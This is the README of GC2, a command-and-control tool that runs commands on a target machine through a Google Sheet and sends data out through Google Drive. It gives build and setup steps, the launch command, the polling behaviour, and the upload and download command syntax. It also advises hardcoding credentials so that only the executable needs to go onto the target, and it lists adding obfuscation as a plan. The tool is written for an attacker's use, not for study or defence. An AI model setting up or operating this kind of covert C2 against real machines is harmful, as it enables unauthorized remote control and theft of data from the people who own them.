# GC2

GC2 (Google Command and Control) is a Command and Control application that allow an attacker to execute command on the target machine using Google Sheet and exfiltrate data using Google Drive.


# Set up

1. **Build executable**
 
    ```bash
    git clone <asdf>
    cd <asdf>
    go build gc2-sheet.go
    ```

2. **Create a new google "service account"**
 
    Create a new google "service account" using [https://console.cloud.google.com/](https://console.cloud.google.com/), create a .json key file for the service account 

3. **Enable Google Drive API**

    Enable Google Drive API [https://developers.google.com/drive/api/v3/enable-drive-api](https://developers.google.com/drive/api/v3/enable-drive-api) and Google Sheet API [https://developers.google.com/sheets/api/quickstart/go](https://developers.google.com/sheets/api/quickstart/go) 

3. **Set up Google Sheet and Google Drive**

    Create a new Google Sheet and add the service account to the editor of the spreadsheet (to add the service account use its email)
    
    Create a new Google Drive folder and add the service account to the editor of the folder (to add the service account use its email)

4. **Start the C2**

    ```bash
    gc2-sheet --key <GCP service account credential in JSON> --sheet <Google sheet ID> --drive <Google drive ID>
    ```
   
   PS: you can also hardcode the parameters in the code, so you will have only the executable to upload on the target machine (look at comments in root.go and authentication.go)

## Features

- Command execution using Google Sheet as a console
- Download files on the target using Google Drive
- Data exfiltration using Google Drive

### Command execution

The program will perform a request to the spreedsheet every 5 sec to check if there is some new command from the column "A" and will print the command result in the column "B". 

### Data exfiltration file

Special commands are reserved to perform the upload and download to the target machine

 ```bash
From Target to Google Drive
upload;<remote path>
Example:
 ```

### Download file

Special commands are reserved to perform the upload and download to the target machine

 ```bash
 From Google Drive to Target
download;<google drive file id>;<remote path>
Example:
 ```

## TO DO

- Test exfiltration and download with large file
- Optimize task execution
- Add some kind of obfuscation

# Support the project

**Pull request** or [![paypal](https://www.paypalobjects.com/en_US/i/btn/btn_donate_SM.gif)](https://www.paypal.com/donate?hosted_button_id=8EWYXPED4ZU5E)